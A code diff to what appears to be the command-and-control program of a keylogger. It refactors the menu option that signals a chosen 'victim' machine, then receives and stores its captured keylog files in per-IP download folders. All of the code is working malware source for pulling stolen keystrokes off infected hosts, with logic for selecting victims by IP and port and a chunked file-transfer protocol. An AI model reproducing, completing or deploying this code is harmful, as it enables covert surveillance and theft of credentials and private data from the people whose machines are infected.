@@ -53,20 +53,17 @@ if __name__ == '__main__':
 
                 # MENU ITEM 4 - Get Keylog File from Victim
                 if command == constants.PERFORM_MENU_ITEM_FOUR:
-                    # Check if client list is empty
+                    # CASE 1: Check if client list is empty
                     if len(connected_clients) == constants.ZERO:
                         print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
 
-                    # Handle single client in client list
+                    # CASE 2: Handle single client in client list
                     if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
                         client_socket, (client_ip, client_port, status) = next(iter(connected_clients.items()))
 
                         # Check if currently keylogging
-                        if status:
-                            print(constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR.format(client_ip, client_port))
-                            print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
-                            print(constants.RETURN_MAIN_MENU_MSG)
-                            print(constants.MENU_CLOSING_BANNER)
+                        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+                            pass
                         else:
                             # Send to victim a notification that it is wanting to receive keylog files
                             print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
@@ -90,83 +87,85 @@ if __name__ == '__main__':
                                     os.mkdir(main_directory)
                                     print(constants.DIRECTORY_SUCCESS_MSG)
 
-                                # Create the subdirectory within the main directory
+                                # Get subdirectory path (downloads/[IP_addr])
                                 sub_directory_path = os.path.join(main_directory, sub_directory)
 
+                                # Create subdirectory (if it doesn't exist)
                                 if not os.path.exists(sub_directory_path):
                                     print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(sub_directory_path))
                                     os.mkdir(sub_directory_path)
                                     print(constants.DIRECTORY_SUCCESS_MSG)
 
-                                    # Send ACK response
-                                    client_socket.send("OK".encode())
+                                # Send ACK response
+                                client_socket.send("OK".encode())
 
-                                    # Get number of files from client/victim for iteration length
-                                    number_of_files = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+                                # Get number of files from client/victim for iteration length
+                                number_of_files = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
 
-                                    # Send ACK
-                                    client_socket.send("OK".encode())
+                                # Send ACK
+                                client_socket.send("OK".encode())
 
-                                    # ADD files from client to commander
-                                    for i in range(int(number_of_files)):
-                                        file_name = client_socket.recv(1024).decode()
-                                        print(constants.RECEIVING_FILE_MSG.format(file_name))
+                                # ADD files from client to commander
+                                receive_keylog_files(client_socket, number_of_files, sub_directory_path)
+                            else:
+                                print(constants.RETURN_MAIN_MENU_MSG)
+                                print(constants.MENU_CLOSING_BANNER)
 
-                                        file_path = os.path.join(sub_directory_path, file_name)
+                    # CASE 3: Handle a specific client/victim (or if multiple clients)
+                    elif len(connected_clients) != constants.ZERO:
+                        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
+                        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
+                        target_socket, target_ip, target_port, status = find_specific_client_socket(connected_clients,
+                                                                                                    target_ip,
+                                                                                                    target_port)
+                        if is_keylogging(status, target_ip, target_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+                            pass
+                        else:
+                            # Send to victim a notification that it is wanting to receive keylog files
+                            print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
+                            target_socket.send(constants.TRANSFER_KEYLOG_FILE_SIGNAL.encode())
 
-                                        with open(file_path, constants.WRITE_BINARY_MODE) as file:
-                                            while True:
-                                                data = client_socket.recv(1024)
-                                                if not data:
-                                                    break
-                                                if data.endswith(constants.END_OF_FILE_SIGNAL):
-                                                    data = data[:-len(constants.END_OF_FILE_SIGNAL)]
-                                                    file.write(data)
-                                                    break
-                                                file.write(data)
+                            # Await response if there are any .txt files to transfer
+                            print(constants.GET_KEYLOG_PROCESS_MSG.format(target_ip, target_port))
+                            response = target_socket.recv(constants.BYTE_LIMIT).decode().split('/')
+                            response_status = response[0]
+                            response_msg = response[1]
+                            print(constants.CLIENT_RESPONSE.format(response_msg))
 
-                                        # Send ACK to commander (if good)
-                                        if is_file_openable(file_path):
-                                            print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
-                                            client_socket.send(constants.VICTIM_ACK.encode())
-                                        else:
-                                            client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
-                                else:
-                                    print(f"[+] DIRECTORY ALREADY EXISTS: {sub_directory_path} already exists!")
+                            # If any files => create directory (eg: downloads/127.0.0.1) => start file transfer
+                            if response_status == constants.STATUS_TRUE:
+                                main_directory = constants.DOWNLOADS_DIR
+                                sub_directory = str(target_ip)
 
-                                    # Send ACK response
-                                    client_socket.send("OK".encode())
+                                # Create the main directory (if it doesn't exist)
+                                if not os.path.exists(main_directory):
+                                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(main_directory))
+                                    os.mkdir(main_directory)
+                                    print(constants.DIRECTORY_SUCCESS_MSG)
 
-                                    # Get number of files from client/victim for iteration length
-                                    number_of_files = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+                                # Create the subdirectory within the main directory
+                                sub_directory_path = os.path.join(main_directory, sub_directory)
 
-                                    # Send ACK
-                                    client_socket.send("OK".encode())
+                                # Create subdirectory (if it doesn't exist)
+                                if not os.path.exists(sub_directory_path):
+                                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(sub_directory_path))
+                                    os.mkdir(sub_directory_path)
+                                    print(constants.DIRECTORY_SUCCESS_MSG)
 
-                                    # ADD files from client to commander
-                                    for i in range(int(number_of_files)):
-                                        file_name = client_socket.recv(1024).decode()
-                                        print(constants.RECEIVING_FILE_MSG.format(file_name))
+                                # Send ACK response
+                                target_socket.send("OK".encode())
 
-                                        file_path = os.path.join(sub_directory_path, file_name)
+                                # Get number of files from client/victim for iteration length
+                                number_of_files = target_socket.recv(constants.MIN_BUFFER_SIZE).decode()
 
-                                        with open(file_path, constants.WRITE_BINARY_MODE) as file:
-                                            while True:
-                                                data = client_socket.recv(1024)
-                                                if not data:
-                                                    break
-                                                if data.endswith(constants.END_OF_FILE_SIGNAL):
-                                                    data = data[:-len(constants.END_OF_FILE_SIGNAL)]
-                                                    file.write(data)
-                                                    break
-                                                file.write(data)
+                                # Send ACK
+                                target_socket.send("OK".encode())
 
-                                        # Send ACK to commander (if good)
-                                        if is_file_openable(file_path):
-                                            print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
-                                            client_socket.send(constants.VICTIM_ACK.encode())
-                                        else:
-                                            client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+                                # ADD files from client to commander
+                                receive_keylog_files(target_socket, number_of_files, sub_directory_path)
+                            else:
+                                print(constants.RETURN_MAIN_MENU_MSG)
+                                print(constants.MENU_CLOSING_BANNER)
 
                 # MENU ITEM 5 - Disconnect from victim
                 if command == constants.PERFORM_MENU_ITEM_FIVE:
